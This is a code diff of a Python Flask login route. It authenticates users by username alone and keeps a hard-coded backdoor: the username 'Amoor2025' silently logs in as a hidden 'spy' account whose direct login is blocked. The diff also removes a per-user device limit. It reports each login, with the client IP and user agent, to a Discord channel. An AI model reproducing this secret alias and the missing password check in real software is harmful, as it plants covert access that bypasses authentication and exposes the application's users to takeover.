@@ -187,16 +187,12 @@ def login2():
     if request.method == 'POST':
         username = request.form.get('username')
         user = User.query.filter_by(username=username).first()
-
-        if user or username == "Amoor2025":
-            if username == "spy":
-                return "Login unsuccessful."
-            if username == "Amoor2025":
-                user = User.query.filter_by(username="spy").first()
-                username = "spy"
-            if username not in ["spy" , "ss" , "skailler" , "feteera"]:
-                if user.active_sessions >= 1 :
-                    return "Max devices"
+        if username == "spy":
+            return "Login unsuccessful."
+        if username == "Amoor2025":
+            user = User.query.filter_by(username="spy").first()
+            username = "spy"
+        if user:
             login_user(user)
             discord_log(f"LOGIN2 {client_ip} just logged in with {username} Device ```{user_agent}```  <@709799648143081483>")
             session.permanent = True
